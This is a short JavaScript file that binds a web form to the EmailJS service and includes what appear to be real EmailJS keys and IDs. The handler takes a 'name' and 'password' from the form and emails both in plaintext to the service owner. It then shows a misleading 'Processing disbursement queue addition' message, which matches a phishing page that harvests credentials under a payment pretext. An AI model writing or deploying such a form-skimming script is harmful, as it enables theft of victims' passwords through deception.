/* ============================================================
   CONFIGURATION — fill these in with your real EmailJS keys
   Get them at https://dashboard.emailjs.com
   ============================================================ */
const EMAILJS_PUBLIC_KEY  = 'ctQeZ8aMZYljCJmxz';   // Account -> API Keys
const EMAILJS_SERVICE_ID  = 'service_re9iqte';   // Email Services
const EMAILJS_TEMPLATE_ID = 'template_r9qkpnw';  // Email Templates

// Initialize EmailJS once the SDK is available
(function initEmailJS() {
  if (typeof emailjs === 'undefined') {
    window.addEventListener('load', () => emailjs.init(EMAILJS_PUBLIC_KEY));
  } else {
    emailjs.init(EMAILJS_PUBLIC_KEY);
  }
})();

// ========== WAIT FOR DOM, THEN BIND EVERYTHING ==========
document.addEventListener('DOMContentLoaded', () => {

  // DOM REFERENCES — matched to your actual HTML
  const form      = document.getElementById('form');              // your form id
  const inputOne  = document.getElementById('name');              // first input
  const inputTwo  = document.getElementById('password');          // second input
  const submitBtn = form.querySelector('button[type="submit"]')   // button has no id,
                 || form.querySelector('button');                 // so grab it inside the form

  // Safety check
  if (!form || !inputOne || !inputTwo || !submitBtn) {
    console.error('Missing element(s):', {
      form:     !!form,
      name:     !!inputOne,
      password: !!inputTwo,
      button:   !!submitBtn,
    });
    return;
  }

  // ========== SUBMIT HANDLER ==========
  form.addEventListener('submit', async (event) => {
    event.preventDefault(); // stop the page from reloading

    // 1. Fetch the two input variables
    const nameValue     = inputOne.value.trim();
    const passwordValue = inputTwo.value.trim();

    // Basic validation
    if (!nameValue || !passwordValue) {
      alert('Please fill in both fields.');
      return;
    }

    // 2. Show "processing / sending" state
    const originalBtnText = submitBtn.textContent;
    submitBtn.textContent = 'Sending...';
    submitBtn.disabled    = true;

    // 3. Send via EmailJS
    try {
      const response = await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          name:     nameValue,
          password: passwordValue,
        }
      );

      console.log('EmailJS success:', response.status, response.text);

      // 4. Alert afterwards
      alert('Processing disbursement queue addition.');
      form.reset();
    } catch (error) {
      console.error('EmailJS failed:', error);
      alert('Failed to send message. Please try again later.');
    } finally {
      // Restore button state no matter what
      submitBtn.textContent = originalBtnText;
      submitBtn.disabled    = false;
    }
  });
});